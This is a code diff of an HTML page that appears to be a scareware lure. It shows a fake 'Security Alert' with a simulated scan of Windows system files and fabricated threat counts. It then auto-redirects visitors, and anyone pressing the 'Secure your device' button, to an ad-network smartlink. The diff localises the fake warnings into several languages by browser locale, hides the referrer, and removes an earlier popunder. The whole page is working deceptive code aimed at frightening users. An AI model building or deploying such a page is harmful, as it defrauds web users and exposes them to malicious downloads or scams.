@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
 <title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -26,8 +27,6 @@
     background-size: 40px 40px;
     z-index: 0;
   }
-
-  /* Banner */
   .banner-top {
     width: 100%; display: flex; justify-content: center; align-items: center;
     padding: 8px 0; background: rgba(0,0,0,0.5); flex-shrink: 0;
@@ -38,50 +37,29 @@
     padding: 8px 0; background: rgba(0,0,0,0.4); margin-top: auto;
     z-index: 2; position: relative;
   }
-
   .container {
-    position: relative;
-    z-index: 1;
-    width: 100%;
-    max-width: 560px;
-    margin: 0 auto;
-    padding: 20px;
-    text-align: center;
+    position: relative; z-index: 1;
+    width: 100%; max-width: 560px;
+    margin: 0 auto; padding: 20px; text-align: center;
   }
   .header {
-    background: #1a0000;
-    border: 1px solid #ff2222;
-    border-radius: 8px 8px 0 0;
-    padding: 10px 20px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    font-size: 12px;
-    color: #ff4444;
-    letter-spacing: 2px;
-    text-transform: uppercase;
+    background: #1a0000; border: 1px solid #ff2222;
+    border-radius: 8px 8px 0 0; padding: 10px 20px;
+    display: flex; align-items: center; justify-content: space-between;
+    font-size: 12px; color: #ff4444; letter-spacing: 2px; text-transform: uppercase;
   }
   .header-dot { width: 8px; height: 8px; border-radius: 50%; background: #ff2222; animation: blink 1s infinite; }
   @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
   .card {
-    background: #111;
-    border: 1px solid #ff2222;
-    border-top: none;
-    border-radius: 0 0 8px 8px;
-    padding: 30px 32px 32px;
+    background: #111; border: 1px solid #ff2222;
+    border-top: none; border-radius: 0 0 8px 8px; padding: 30px 32px 32px;
   }
   .icon-wrap {
-    position: relative;
-    width: 120px;
-    height: 110px;
-    margin: 0 auto 20px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    position: relative; width: 120px; height: 110px;
+    margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
   }
   .triangle-svg {
-    position: absolute;
-    top: 0; left: 0;
+    position: absolute; top: 0; left: 0;
     width: 120px; height: 110px;
     animation: pulse-tri 2s ease-in-out infinite;
   }
@@ -90,107 +68,44 @@
     50% { filter: drop-shadow(0 0 18px #ff4444); }
   }
   .exclaim {
-    position: absolute;
-    top: 50%; left: 50%;
+    position: absolute; top: 50%; left: 50%;
     transform: translate(-50%, -44%);
-    font-size: 46px; font-weight: 900;
-    color: #ff2222; line-height: 1;
+    font-size: 46px; font-weight: 900; color: #ff2222; line-height: 1;
     animation: pulse-tri 2s ease-in-out infinite;
   }
-  .title {
-    font-size: 28px; font-weight: 800;
-    letter-spacing: 3px; color: #fff; margin-bottom: 4px;
-  }
+  .title { font-size: 28px; font-weight: 800; letter-spacing: 3px; color: #fff; margin-bottom: 4px; }
   .title span { color: #ff2222; }
-  .subtitle {
-    font-size: 12px; letter-spacing: 3px;
-    color: #ff4444; margin-bottom: 20px; text-transform: uppercase;
-  }
+  .subtitle { font-size: 12px; letter-spacing: 3px; color: #ff4444; margin-bottom: 20px; text-transform: uppercase; }
   .status-box {
     background: #1a0000; border: 1px solid #ff2222;
     border-radius: 6px; padding: 14px 20px;
     display: flex; align-items: center; gap: 16px;
     margin-bottom: 20px; text-align: left;
   }
-  .status-text-main {
-    font-size: 13px; font-weight: 700;
-    letter-spacing: 1.5px; color: #fff; text-transform: uppercase;
-  }
-  .status-text-sub {
-    font-size: 11px; color: #ff4444;
-    letter-spacing: 1px; margin-top: 2px;
-    animation: blink 1s infinite;
-  }
-
-  /* === SCAN BOX seperti Drive C === */
+  .status-text-main { font-size: 13px; font-weight: 700; letter-spacing: 1.5px; color: #fff; text-transform: uppercase; }
+  .status-text-sub { font-size: 11px; color: #ff4444; letter-spacing: 1px; margin-top: 2px; animation: blink 1s infinite; }
   .scan-box {
-    background: #0a0a0a;
-    border: 1px solid #2a2a2a;
-    border-radius: 6px;
-    padding: 10px 14px;
-    margin-bottom: 14px;
-    text-align: left;
+    background: #0a0a0a; border: 1px solid #2a2a2a;
+    border-radius: 6px; padding: 10px 14px;
+    margin-bottom: 14px; text-align: left;
     font-family: 'Courier New', monospace;
   }
-  .scan-box-title {
-    font-size: 10px; color: #666;
-    letter-spacing: 2px; text-transform: uppercase;
-    margin-bottom: 8px; border-bottom: 1px solid #1a1a1a;
-    padding-bottom: 6px;
-  }
-  .scan-path {
-    font-size: 11px;
-    color: #00cc44;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    min-height: 16px;
-    line-height: 1.5;
-  }
+  .scan-box-title { font-size: 10px; color: #666; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; border-bottom: 1px solid #1a1a1a; padding-bottom: 6px; }
+  .scan-path { font-size: 11px; color: #00cc44; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-height: 16px; line-height: 1.5; }
   .scan-path span { color: #ff6644; }
-  .scan-current {
-    font-size: 10px; color: #555;
-    margin-top: 4px; letter-spacing: 1px;
-  }
-
-  .scan-label {
-    font-size: 11px; letter-spacing: 2px;
-    color: #888; text-align: left;
-    margin-bottom: 6px; text-transform: uppercase;
-  }
-  .scan-track {
-    background: #1a1a1a; border-radius: 3px;
-    height: 14px; overflow: hidden;
-    margin-bottom: 6px; border: 1px solid #333;
-  }
-  .scan-fill {
-    height: 100%; width: 0%;
-    background: linear-gradient(90deg, #ff2222, #ff6644);
-    border-radius: 2px;
-    transition: width 0.1s linear;
-    box-shadow: 0 0 8px rgba(255,34,34,0.6);
-  }
-  .scan-pct {
-    font-size: 12px; color: #ff4444;
-    text-align: right; font-weight: 700;
-    letter-spacing: 1px; margin-bottom: 16px;
-  }
+  .scan-current { font-size: 10px; color: #555; margin-top: 4px; letter-spacing: 1px; }
+  .scan-label { font-size: 11px; letter-spacing: 2px; color: #888; text-align: left; margin-bottom: 6px; text-transform: uppercase; }
+  .scan-track { background: #1a1a1a; border-radius: 3px; height: 14px; overflow: hidden; margin-bottom: 6px; border: 1px solid #333; }
+  .scan-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #ff2222, #ff6644); border-radius: 2px; transition: width 0.1s linear; box-shadow: 0 0 8px rgba(255,34,34,0.6); }
+  .scan-pct { font-size: 12px; color: #ff4444; text-align: right; font-weight: 700; letter-spacing: 1px; margin-bottom: 16px; }
   .scan-stats-row {
     display: flex; justify-content: space-between;
-    font-family: 'Courier New', monospace;
-    font-size: 10px; color: #555;
-    margin-bottom: 18px;
-    border-top: 1px solid #1a1a1a;
-    padding-top: 8px;
+    font-family: 'Courier New', monospace; font-size: 10px; color: #555;
+    margin-bottom: 18px; border-top: 1px solid #1a1a1a; padding-top: 8px;
   }
   .scan-stat-item { text-align: center; }
   .scan-stat-item span { display: block; color: #ff4444; font-weight: 700; font-size: 12px; }
-
-  .stats {
-    display: flex; justify-content: space-around;
-    border-top: 1px solid #222;
-    padding-top: 20px; margin-bottom: 24px;
-  }
+  .stats { display: flex; justify-content: space-around; border-top: 1px solid #222; padding-top: 20px; margin-bottom: 24px; }
   .stat { text-align: center; }
   .stat-icon { font-size: 20px; margin-bottom: 4px; }
   .stat-label { font-size: 9px; letter-spacing: 1.5px; color: #666; text-transform: uppercase; }
@@ -202,14 +117,13 @@
     letter-spacing: 2px; text-transform: uppercase;
     border: none; border-radius: 6px;
     cursor: pointer; text-decoration: none;
-    transition: background 0.2s, transform 0.1s;
     animation: pulse-btn 2s ease-in-out infinite;
   }
   @keyframes pulse-btn {
     0%,100%{ box-shadow: 0 0 10px #ff222266; }
     50%{ box-shadow: 0 0 24px #ff2222aa; }
   }
-  .cta-btn:hover { background: #cc0000; transform: scale(1.01); }
+  .cta-btn:hover { background: #cc0000; }
   .redirect-overlay {
     display: none; position: fixed; inset: 0;
     background: rgba(0,0,0,0.95); z-index: 999;
@@ -225,27 +139,27 @@
 <body>
 <div class="bg-grid"></div>
 
-<!-- BANNER TOP (320x50) -->
+<!-- BANNER TOP 728x90 -->
 <div class="banner-top">
   <script>
     atOptions = {
-      'key' : 'f0a9357fc524712b4e1f8906d53dbe9f',
+      'key' : '4fa914204b07ffb4f00bd0f84fdde41d',
       'format' : 'iframe',
-      'height' : 50,
-      'width' : 320,
+      'height' : 90,
+      'width' : 728,
       'params' : {}
     };
   </script>
-  <script src="https://www.highperformanceformat.com/f0a9357fc524712b4e1f8906d53dbe9f/invoke.js"></script>
+  <script src="https://www.highperformanceformat.com/4fa914204b07ffb4f00bd0f84fdde41d/invoke.js"></script>
 </div>
 
 <div class="container">
   <div class="header">
     <div style="display:flex;align-items:center;gap:8px;">
       <div class="header-dot"></div>
-      <span>Security Center</span>
+      <span id="headerLeft">Security Center</span>
     </div>
-    <span>LIVE MONITORING</span>
+    <span id="headerRight">LIVE MONITORING</span>
   </div>
 
   <div class="card">
@@ -256,8 +170,8 @@
       <div class="exclaim">!</div>
     </div>
 
-    <div class="title">SECURITY <span>ALERT</span></div>
-    <div class="subtitle">| Unauthorized Access Detected |</div>
+    <div class="title" id="mainTitle">SECURITY <span>ALERT</span></div>
+    <div class="subtitle" id="subTitle">| Unauthorized Access Detected |</div>
 
     <div class="status-box">
       <div style="flex-shrink:0;">
@@ -269,58 +183,52 @@
         </svg>
       </div>
       <div>
-        <div class="status-text-main">Your system is being monitored</div>
+        <div class="status-text-main" id="statusMain">Your system is being monitored</div>
         <div class="status-text-sub" id="statusSub">PLEASE STAND BY...</div>
       </div>
     </div>
 
-    <!-- SCAN BOX FILE PATH -->
     <div class="scan-box">
-      <div class="scan-box-title">📂 Scanning Drive C:\</div>
+      <div class="scan-box-title" id="scanBoxTitle">📂 Scanning Drive C:\</div>
       <div class="scan-path" id="scanPath"><span>C:\</span>Windows\System32\...</div>
       <div class="scan-current" id="scanCurrent">Files scanned: 0</div>
     </div>
 
     <div class="scan-label" id="scanLabel">Scanning System...</div>
-    <div class="scan-track">
-      <div class="scan-fill" id="scanFill"></div>
-    </div>
+    <div class="scan-track"><div class="scan-fill" id="scanFill"></div></div>
     <div class="scan-pct" id="scanPct">0%</div>
 
-    <!-- Stats row -->
     <div class="scan-stats-row">
-      <div class="scan-stat-item">FILES SCANNED<span id="statFiles">0</span></div>
-      <div class="scan-stat-item">THREATS FOUND<span id="statThreats" style="color:#ff2222">0</span></div>
-      <div class="scan-stat-item">INFECTED<span id="statInfected" style="color:#ff6644">0</span></div>
-      <div class="scan-stat-item">TIME LEFT<span id="statTime">15s</span></div>
+      <div class="scan-stat-item"><span id="labelFiles">FILES SCANNED</span><span id="statFiles">0</span></div>
+      <div class="scan-stat-item"><span id="labelThreats">THREATS FOUND</span><span id="statThreats" style="color:#ff2222">0</span></div>
+      <div class="scan-stat-item"><span id="labelInfected">INFECTED</span><span id="statInfected" style="color:#ff6644">0</span></div>
+      <div class="scan-stat-item"><span id="labelTime">TIME LEFT</span><span id="statTime">15s</span></div>
     </div>
 
     <div class="stats">
       <div class="stat">
         <div class="stat-icon">🛡️</div>
-        <div class="stat-label">System Protection</div>
-        <div class="stat-val">ACTIVE</div>
+        <div class="stat-label" id="statL1">System Protection</div>
+        <div class="stat-val" id="statV1">ACTIVE</div>
       </div>
       <div class="stat">
         <div class="stat-icon">🌐</div>
-        <div class="stat-label">Network Security</div>
-        <div class="stat-val">SECURE</div>
+        <div class="stat-label" id="statL2">Network Security</div>
+        <div class="stat-val" id="statV2">SECURE</div>
       </div>
       <div class="stat">
         <div class="stat-icon">🔥</div>
-        <div class="stat-label">Firewall</div>
-        <div class="stat-val">ACTIVE</div>
+        <div class="stat-label" id="statL3">Firewall</div>
+        <div class="stat-val" id="statV3">ACTIVE</div>
       </div>
       <div class="stat">
         <div class="stat-icon">🔍</div>
-        <div class="stat-label">Threat Detection</div>
-        <div class="stat-val">ON</div>
+        <div class="stat-label" id="statL4">Threat Detection</div>
+        <div class="stat-val" id="statV4">ON</div>
       </div>
     </div>
 
-    <a href="https://your-smartlink.com" class="cta-btn" id="ctaBtn">
-      🔒 SECURE YOUR DEVICE NOW
-    </a>
+    <a href="#" class="cta-btn" id="ctaBtn">🔒 SECURE YOUR DEVICE NOW</a>
   </div>
 </div>
 
@@ -341,28 +249,194 @@
 <!-- REDIRECT OVERLAY -->
 <div class="redirect-overlay" id="redirectOverlay">
   <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
-  <div class="redirect-title">3 THREATS DETECTED!</div>
-  <div class="redirect-sub">Redirecting to protection page in...</div>
+  <div class="redirect-title" id="overlayTitle">3 THREATS DETECTED!</div>
+  <div class="redirect-sub" id="overlaySub">Redirecting to protection page in...</div>
   <div class="redirect-count" id="countNum">3</div>
 </div>
 
 <script>
-  var SMARTLINK = 'https://your-smartlink.com';
+  var SMARTLINK = 'https://www.effectivecpmnetwork.com/dhhvxjv79?key=29f4b13b03d6d8b8a20ff08c0b67d877';
 
-  // Pop under
-  var popped = false;
-  function doPopunder() {
-    if (popped) return; popped = true;
-    var w = window.open('about:blank', '_blank');
-    if (w) {
-      w.document.write('<script>window.location="' + SMARTLINK + '";<\/script>');
-      w.blur(); window.focus();
+  // ── Multi-bahasa ──────────────────────────────────────────────
+  var LANG = {
+    SE: {
+      headerLeft:  'Säkerhetscenter',
+      headerRight: 'LIVE ÖVERVAKNING',
+      mainTitle:   'SÄKERHETS<span style="color:#ff2222">VARNING</span>',
+      subTitle:    '| Obehörig åtkomst upptäckt |',
+      statusMain:  'Ditt system övervakas',
+      standBy:     'VÄNLIGEN VÄNTA...',
+      scanBoxTitle:'📂 Skannar enhet C:\\',
+      scanInit:    'Skannar system...',
+      labelFiles:  'FILER SKANNADE',
+      labelThreats:'HOT HITTADE',
+      labelInfected:'INFEKTERADE',
+      labelTime:   'TID KVAR',
+      statL1: 'Systemskydd',      statV1: 'AKTIV',
+      statL2: 'Nätverkssäkerhet', statV2: 'SÄKER',
+      statL3: 'Brandvägg',        statV3: 'AKTIV',
+      statL4: 'Hotdetektering',   statV4: 'PÅ',
+      ctaBtn:      '🔒 SÄKRA DIN ENHET NU',
+      overlayTitle:'3 HOT UPPTÄCKTA!',
+      overlaySub:  'Omdirigerar till skyddssida om...',
+      msgs: {
+        s0:  'Skannar system...',       st0: 'VÄNLIGEN VÄNTA...',
+        s20: 'Kontrollerar OS-filer...', st20:'SKANNING PÅGÅR...',
+        s40: 'Analyserar nätverkstrafik...', st40:'ÖVERVAKAR ANSLUTNINGAR...',
+        s60: 'Upptäcker hot...',         st60:'HOT UPPTÄCKTA...',
+        s80: 'Verifierar intrång...',    st80:'ANALYSERAR HOT...',
+        s95: 'Slutför rapport...',       st95:'KRITISK RISK HITTAD!',
+      }
+    },
+    DE: {
+      headerLeft:  'Sicherheitszentrum',
+      headerRight: 'LIVE ÜBERWACHUNG',
+      mainTitle:   'SICHERHEITS<span style="color:#ff2222">WARNUNG</span>',
+      subTitle:    '| Unbefugter Zugriff erkannt |',
+      statusMain:  'Ihr System wird überwacht',
+      standBy:     'BITTE WARTEN...',
+      scanBoxTitle:'📂 Scanne Laufwerk C:\\',
+      scanInit:    'System wird gescannt...',
+      labelFiles:  'GESCANNTE DATEIEN',
+      labelThreats:'BEDROHUNGEN',
+      labelInfected:'INFIZIERT',
+      labelTime:   'VERBLEIBEND',
+      statL1: 'Systemschutz',      statV1: 'AKTIV',
+      statL2: 'Netzwerksicherheit',statV2: 'SICHER',
+      statL3: 'Firewall',          statV3: 'AKTIV',
+      statL4: 'Bedrohungserkennung',statV4: 'AN',
+      ctaBtn:      '🔒 GERÄT JETZT SICHERN',
+      overlayTitle:'3 BEDROHUNGEN GEFUNDEN!',
+      overlaySub:  'Weiterleitung zur Schutzseite in...',
+      msgs: {
+        s0:  'System wird gescannt...',     st0: 'BITTE WARTEN...',
+        s20: 'OS-Dateien werden geprüft...', st20:'SCAN LÄUFT...',
+        s40: 'Netzwerkverkehr analysieren...', st40:'VERBINDUNGEN ÜBERWACHEN...',
+        s60: 'Bedrohungen erkennen...',      st60:'BEDROHUNGEN ERKANNT...',
+        s80: 'Einbrüche prüfen...',          st80:'BEDROHUNGEN ANALYSIEREN...',
+        s95: 'Bericht abschließen...',       st95:'KRITISCHES RISIKO!',
+      }
+    },
+    CA: {
+      headerLeft:  'Centre de sécurité',
+      headerRight: 'SURVEILLANCE EN DIRECT',
+      mainTitle:   'ALERTE DE <span style="color:#ff2222">SÉCURITÉ</span>',
+      subTitle:    '| Accès non autorisé détecté |',
+      statusMain:  'Votre système est surveillé',
+      standBy:     'VEUILLEZ PATIENTER...',
+      scanBoxTitle:'📂 Analyse du lecteur C:\\',
+      scanInit:    'Analyse du système...',
+      labelFiles:  'FICHIERS ANALYSÉS',
+      labelThreats:'MENACES TROUVÉES',
+      labelInfected:'INFECTÉS',
+      labelTime:   'TEMPS RESTANT',
+      statL1: 'Protection système',  statV1: 'ACTIF',
+      statL2: 'Sécurité réseau',     statV2: 'SÉCURISÉ',
+      statL3: 'Pare-feu',            statV3: 'ACTIF',
+      statL4: 'Détection menaces',   statV4: 'ON',
+      ctaBtn:      '🔒 SÉCURISER VOTRE APPAREIL',
+      overlayTitle:'3 MENACES DÉTECTÉES!',
+      overlaySub:  'Redirection vers la page de protection dans...',
+      msgs: {
+        s0:  'Analyse du système...',       st0: 'VEUILLEZ PATIENTER...',
+        s20: 'Vérification des fichiers OS...',st20:'ANALYSE EN COURS...',
+        s40: 'Analyse du trafic réseau...', st40:'SURVEILLANCE DES CONNEXIONS...',
+        s60: 'Détection des menaces...',    st60:'MENACES DÉTECTÉES...',
+        s80: 'Vérification des intrusions...',st80:'ANALYSE DES MENACES...',
+        s95: 'Finalisation du rapport...', st95:'RISQUE CRITIQUE TROUVÉ!',
+      }
+    },
+    JP: {
+      headerLeft:  'セキュリティセンター',
+      headerRight: 'ライブ監視',
+      mainTitle:   'セキュリティ<span style="color:#ff2222">アラート</span>',
+      subTitle:    '| 不正アクセスが検出されました |',
+      statusMain:  'あなたのシステムは監視されています',
+      standBy:     'しばらくお待ちください...',
+      scanBoxTitle:'📂 ドライブ C:\\ をスキャン中',
+      scanInit:    'システムをスキャン中...',
+      labelFiles:  'スキャン済みファイル',
+      labelThreats:'脅威検出数',
+      labelInfected:'感染数',
+      labelTime:   '残り時間',
+      statL1: 'システム保護',    statV1: '有効',
+      statL2: 'ネットワーク保護', statV2: '安全',
+      statL3: 'ファイアウォール', statV3: '有効',
+      statL4: '脅威検出',       statV4: 'ON',
+      ctaBtn:      '🔒 今すぐデバイスを保護する',
+      overlayTitle:'脅威が3件検出されました！',
+      overlaySub:  '保護ページにリダイレクト中...',
+      msgs: {
+        s0:  'システムをスキャン中...',    st0: 'しばらくお待ちください...',
+        s20: 'OSファイルを確認中...',      st20:'スキャン進行中...',
+        s40: 'ネットワーク通信を分析中...', st40:'接続を監視中...',
+        s60: '脅威を検出中...',           st60:'脅威を検出しました...',
+        s80: '侵入を確認中...',           st80:'脅威を分析中...',
+        s95: 'レポートを確定中...',       st95:'重大なリスクが見つかりました！',
+      }
+    },
+    EN: {
+      headerLeft:  'Security Center',
+      headerRight: 'LIVE MONITORING',
+      mainTitle:   'SECURITY <span style="color:#ff2222">ALERT</span>',
+      subTitle:    '| Unauthorized Access Detected |',
+      statusMain:  'Your system is being monitored',
+      standBy:     'PLEASE STAND BY...',
+      scanBoxTitle:'📂 Scanning Drive C:\\',
+      scanInit:    'Scanning System...',
+      labelFiles:  'FILES SCANNED',
+      labelThreats:'THREATS FOUND',
+      labelInfected:'INFECTED',
+      labelTime:   'TIME LEFT',
+      statL1: 'System Protection', statV1: 'ACTIVE',
+      statL2: 'Network Security',  statV2: 'SECURE',
+      statL3: 'Firewall',          statV3: 'ACTIVE',
+      statL4: 'Threat Detection',  statV4: 'ON',
+      ctaBtn:      '🔒 SECURE YOUR DEVICE NOW',
+      overlayTitle:'3 THREATS DETECTED!',
+      overlaySub:  'Redirecting to protection page in...',
+      msgs: {
+        s0:  'Scanning System...',           st0: 'PLEASE STAND BY...',
+        s20: 'Checking OS files...',          st20:'SCANNING IN PROGRESS...',
+        s40: 'Analyzing network traffic...', st40:'MONITORING CONNECTIONS...',
+        s60: 'Detecting threats...',          st60:'THREATS DETECTED...',
+        s80: 'Verifying intrusions...',       st80:'ANALYZING THREATS...',
+        s95: 'Finalizing report...',          st95:'CRITICAL RISK FOUND!',
+      }
     }
-  }
-  document.addEventListener('click', doPopunder, { once: true });
-  document.addEventListener('touchstart', doPopunder, { once: true });
+  };
 
-  // File paths untuk animasi scan
+  var langRaw = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
+  var cc = langRaw.includes('-') ? langRaw.split('-')[1].toUpperCase() : langRaw.toUpperCase();
+  var t = LANG[cc] || LANG['EN'];
+
+  // Terapkan teks
+  document.getElementById('headerLeft').textContent   = t.headerLeft;
+  document.getElementById('headerRight').textContent  = t.headerRight;
+  document.getElementById('mainTitle').innerHTML      = t.mainTitle;
+  document.getElementById('subTitle').textContent     = t.subTitle;
+  document.getElementById('statusMain').textContent   = t.statusMain;
+  document.getElementById('statusSub').textContent    = t.standBy;
+  document.getElementById('scanBoxTitle').textContent = t.scanBoxTitle;
+  document.getElementById('scanLabel').textContent    = t.scanInit;
+  document.getElementById('labelFiles').textContent   = t.labelFiles;
+  document.getElementById('labelThreats').textContent = t.labelThreats;
+  document.getElementById('labelInfected').textContent= t.labelInfected;
+  document.getElementById('labelTime').textContent    = t.labelTime;
+  document.getElementById('statL1').textContent       = t.statL1;
+  document.getElementById('statV1').textContent       = t.statV1;
+  document.getElementById('statL2').textContent       = t.statL2;
+  document.getElementById('statV2').textContent       = t.statV2;
+  document.getElementById('statL3').textContent       = t.statL3;
+  document.getElementById('statV3').textContent       = t.statV3;
+  document.getElementById('statL4').textContent       = t.statL4;
+  document.getElementById('statV4').textContent       = t.statV4;
+  document.getElementById('ctaBtn').textContent       = t.ctaBtn;
+  document.getElementById('overlayTitle').textContent = t.overlayTitle;
+  document.getElementById('overlaySub').textContent   = t.overlaySub;
+  document.getElementById('ctaBtn').href              = SMARTLINK;
+
+  // ── File paths ────────────────────────────────────────────────
   var filePaths = [
     'C:\\Windows\\System32\\drivers\\etc\\hosts',
     'C:\\Windows\\System32\\svchost.exe',
@@ -396,30 +470,25 @@
     'C:\\Windows\\System32\\csrss.exe',
   ];
 
-  var pathEl      = document.getElementById('scanPath');
-  var currentEl   = document.getElementById('scanCurrent');
-  var fill        = document.getElementById('scanFill');
-  var pctEl       = document.getElementById('scanPct');
-  var statusSub   = document.getElementById('statusSub');
-  var scanLabel   = document.getElementById('scanLabel');
-  var statFiles   = document.getElementById('statFiles');
-  var statThreats = document.getElementById('statThreats');
-  var statInfected= document.getElementById('statInfected');
-  var statTime    = document.getElementById('statTime');
+  var pathEl       = document.getElementById('scanPath');
+  var currentEl    = document.getElementById('scanCurrent');
+  var fill         = document.getElementById('scanFill');
+  var pctEl        = document.getElementById('scanPct');
+  var statusSub    = document.getElementById('statusSub');
+  var scanLabel    = document.getElementById('scanLabel');
+  var statFiles    = document.getElementById('statFiles');
+  var statThreats  = document.getElementById('statThreats');
+  var statInfected = document.getElementById('statInfected');
+  var statTime     = document.getElementById('statTime');
 
-  var pct          = 0;
-  var filesScanned = 0;
-  var threats      = 0;
-  var infected     = 0;
-  var timeLeft     = 15;
-  var pathIndex    = 0;
+  var pct = 0, filesScanned = 0, threats = 0, infected = 0;
+  var timeLeft = 15, pathIndex = 0;
+  var DURATION_MS = 15000, INTERVAL_MS = 100;
+  var STEPS = DURATION_MS / INTERVAL_MS;
+  var INCREMENT = 100 / STEPS;
+  var msgs = t.msgs;
 
-  var DURATION_MS  = 15000;
-  var INTERVAL_MS  = 100;
-  var STEPS        = DURATION_MS / INTERVAL_MS; // 150
-  var INCREMENT    = 100 / STEPS;
-
-  // Update file path tiap 300ms
+  // File path tiap 300ms
   var pathTimer = setInterval(function() {
     var p = filePaths[pathIndex % filePaths.length];
     var parts = p.split('\\');
@@ -428,42 +497,36 @@
     pathEl.innerHTML = '<span>' + drive + '</span>' + rest;
     pathIndex++;
     filesScanned += Math.floor(Math.random() * 120 + 40);
-    currentEl.textContent = 'Files scanned: ' + filesScanned.toLocaleString();
+    currentEl.textContent = t.labelFiles + ': ' + filesScanned.toLocaleString();
     statFiles.textContent = filesScanned.toLocaleString();
   }, 300);
 
-  // Countdown waktu tiap 1 detik
+  // Countdown waktu
   var timeTimer = setInterval(function() {
     timeLeft--;
     statTime.textContent = timeLeft + 's';
     if (timeLeft <= 0) clearInterval(timeTimer);
   }, 1000);
 
-  // Progress bar utama tiap 100ms
+  // Progress bar
   var scanInterval = setInterval(function() {
     pct = Math.min(pct + INCREMENT, 100);
     fill.style.width = pct.toFixed(2) + '%';
     pctEl.textContent = Math.floor(pct) + '%';
 
-    // Pesan berubah
     if (pct >= 95) {
-      scanLabel.textContent = 'Finalizing report...';
-      statusSub.textContent = 'CRITICAL RISK FOUND!';
+      scanLabel.textContent = msgs.s95; statusSub.textContent = msgs.st95;
     } else if (pct >= 80) {
-      scanLabel.textContent = 'Verifying intrusions...';
-      statusSub.textContent = 'ANALYZING THREATS...';
+      scanLabel.textContent = msgs.s80; statusSub.textContent = msgs.st80;
       if (threats < 3) { threats++; statThreats.textContent = threats; }
       if (infected < 2) { infected++; statInfected.textContent = infected; }
     } else if (pct >= 60) {
-      scanLabel.textContent = 'Detecting threats...';
-      statusSub.textContent = 'THREATS DETECTED...';
+      scanLabel.textContent = msgs.s60; statusSub.textContent = msgs.st60;
       if (threats < 1) { threats = 1; statThreats.textContent = threats; }
     } else if (pct >= 40) {
-      scanLabel.textContent = 'Analyzing network traffic...';
-      statusSub.textContent = 'MONITORING CONNECTIONS...';
+      scanLabel.textContent = msgs.s40; statusSub.textContent = msgs.st40;
     } else if (pct >= 20) {
-      scanLabel.textContent = 'Checking OS files...';
-      statusSub.textContent = 'SCANNING IN PROGRESS...';
+      scanLabel.textContent = msgs.s20; statusSub.textContent = msgs.st20;
     }
 
     if (pct >= 100) {
@@ -486,15 +549,14 @@
       countEl.textContent = count;
       if (count <= 0) {
         clearInterval(cd);
-        window.location.href = SMARTLINK;
+        window.location.href = SMARTLINK; // ✅ redirect langsung
       }
     }, 1000);
   }
 
   document.getElementById('ctaBtn').addEventListener('click', function(e) {
     e.preventDefault();
-    doPopunder();
-    window.location.href = SMARTLINK;
+    window.location.href = SMARTLINK; // ✅ redirect langsung
   });
 </script>
 </body>
